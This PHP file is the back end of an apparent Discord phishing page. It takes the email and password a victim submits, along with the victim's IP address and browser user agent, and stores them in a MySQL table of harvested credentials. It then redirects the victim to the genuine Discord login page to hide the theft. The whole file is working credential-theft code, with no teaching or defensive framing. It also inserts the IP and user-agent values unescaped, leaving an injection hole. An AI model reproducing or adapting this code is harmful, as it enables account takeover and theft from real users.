<?php
$host = "localhost";
$user = "root";
$pass = "";
$db   = "phishing_discord";

$conn = new mysqli($host, $user, $pass, $db);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $conn->real_escape_string($_POST['email']);
    $senha = $conn->real_escape_string($_POST['senha']);

    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $data = date('Y-m-d H:i:s');

    $sql = "INSERT INTO credenciais (email, senha, ip, user_agent, data_coleta)
            VALUES ('$email', '$senha', '$ip', '$user_agent', '$data')";

    if ($conn->query($sql) === TRUE) {
        header("Location: https://discord.com/login");
        exit();
    } else {
        echo "Erro ao salvar os dados.";
    }
}
$conn->close();
?>